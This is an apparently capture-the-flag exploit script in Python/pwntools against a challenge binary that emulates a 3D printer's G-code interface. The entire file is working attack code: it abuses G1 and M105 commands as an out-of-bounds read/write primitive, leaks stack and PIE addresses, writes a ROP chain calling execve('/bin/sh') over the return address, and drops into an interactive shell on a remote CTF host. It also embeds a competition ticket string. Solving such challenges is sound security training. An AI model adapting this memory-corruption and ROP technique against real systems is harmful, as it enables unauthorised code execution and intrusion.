from pwn import *

# p = process("./youwouldntdownloada3dprinter")
p = remote("ywdap-gxxbmllql77s2.shellweplayaga.me",1404)
p.sendline(b'ticket{CocoaGromit8440n25:-HOsWO1QBZ1Oj-ssuRmHqEr0lcAgjLTbSPtwMIgnaz627V96}')

p.recvline()
p.sendline(f"G90")
p.recvline()

LAST_OFFSET = 0

def moveTo(offset):
    global LAST_OFFSET
    if offset == LAST_OFFSET:
        return
    LAST_OFFSET = offset
    y = offset // 250
    z = offset % 250
    
    p.sendline(f"G1 Y{y} Z{z}")
    p.recvline()

def readFromOffset(offset) -> int: 
    moveTo(offset)
    p.sendline("M105")
    data = p.recvline()
    diocane = data.split(b"V:")[1].strip()
    return int(diocane.decode("utf-8"))

def writeAdd(offset, value):
    moveTo(offset)
    p.sendline(f"G1 E{value}")
    p.recvline()
def write(offset, value):
    val = readFromOffset(offset)
    p.sendline(f"G1 E{(value - val) % 256}")
    p.recvline()

#p.interactive()

def writeAddress(offset, address):
    # extract each addr byte
    addr = [address & 0xFF, (address >> 8) & 0xFF, (address >> 16) & 0xFF, (address >> 24) & 0xFF, 
            (address >> 32) & 0xFF, (address >> 40) & 0xFF, (address >> 48) & 0xFF, (address >> 56) & 0xFF]
    for i in range(8):
        write(offset + i, addr[i])

def readAddress(offset):
    # read each addr byte
    addr = 0
    for i in range(8):
        addr |= readFromOffset(offset + i) << (i * 8)
    return addr

# debug
writeAddress(0, u64(b'/bin/sh\x00'))

stack_leak = readAddress(-8)
print("stack_leak", hex(stack_leak))
pie_leak = readAddress(15625000) - 0x18d60
print(hex(pie_leak))
elf = ELF("./youwouldntdownloada3dprinter")
elf.address = pie_leak
matrix_address = elf.address + 0x50008

ret_addr = stack_leak-248
print(hex(ret_addr))

writeAddress(ret_addr - matrix_address, elf.address + 0x000000000003342a) # pop rdi; ret
writeAddress(ret_addr - matrix_address + 1*8, matrix_address) # pop rdi; ret
writeAddress(ret_addr - matrix_address + 2*8, elf.address + 0x000000000003de12) # pop rsi; ret
writeAddress(ret_addr - matrix_address + 3*8, 0) # pop rsi; ret
writeAddress(ret_addr - matrix_address + 4*8, elf.address + 0x00000000000469ac) # pop rdx; ret
writeAddress(ret_addr - matrix_address + 5*8, 0) # pop rsi; ret
writeAddress(ret_addr - matrix_address + 6*8, elf.address + 0x000000000001884b) # pop rax; ret
writeAddress(ret_addr - matrix_address + 7*8, 0x3b) 
writeAddress(ret_addr - matrix_address + 8*8, elf.address + 0x0000000000011da5) # syscall


p.sendline(b"M84")

# gdb.attach(p, """
# b *0x7ffff7018b0c
# """.strip())
p.interactive()